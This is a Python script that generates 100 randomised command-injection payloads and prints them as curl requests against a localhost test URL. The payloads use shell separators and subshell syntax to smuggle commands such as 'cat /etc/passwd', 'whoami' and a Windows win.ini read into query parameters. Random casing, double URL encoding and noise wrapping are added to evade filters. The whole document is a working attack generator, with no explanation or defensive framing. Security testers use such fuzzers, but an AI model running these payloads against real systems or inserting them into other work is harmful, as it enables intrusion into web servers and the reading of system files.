import random
import urllib.parse

TARGET = "http://localhost/test?"

PARAMS = [
    "ip", "host", "target", "cmd",
    "query", "user", "name", "data"
]

SEPARATORS = [
    ";",
    "&&",
    "||",
    "|",
    "&"
]

COMMANDS = [
    "whoami",
    "id",
    "ls",
    "cat /etc/passwd",
    "pwd",
    "uname -a",
    "dir",
    "type C:\\Windows\\win.ini",
    "ping 127.0.0.1",
    "echo test",
    "netstat -an"
]

SUBSHELL_PATTERNS = [
    lambda cmd: f"`{cmd}`",
    lambda cmd: f"$({cmd})",
    lambda cmd: f"${{{cmd}}}"
]

def random_case(s):
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

def maybe_encode(s):
    if random.random() > 0.5:
        s = urllib.parse.quote(s)
    if random.random() > 0.7:
        s = urllib.parse.quote(s)
    return s

def maybe_noise_wrap(s):
    wrappers = [
        lambda x: x,
        lambda x: "abc" + x,
        lambda x: x + "123",
        lambda x: "test" + x + "data"
    ]
    return random.choice(wrappers)(s)

def generate_payload():
    base_value = "127.0.0.1"

    if random.random() > 0.6:
        cmd = random.choice(COMMANDS)
        payload = random.choice(SUBSHELL_PATTERNS)(cmd)
    else:
        sep = random.choice(SEPARATORS)
        cmd = random.choice(COMMANDS)
        payload = base_value + sep + cmd

    if random.random() > 0.5:
        payload = random_case(payload)

    payload = maybe_noise_wrap(payload)
    payload = maybe_encode(payload)

    return payload

generated = set()

while len(generated) < 100:
    param = random.choice(PARAMS)
    payload = generate_payload()
    curl_cmd = f'curl "{TARGET}{param}={payload}"'
    generated.add(curl_cmd)

for cmd in generated:
    print(cmd)
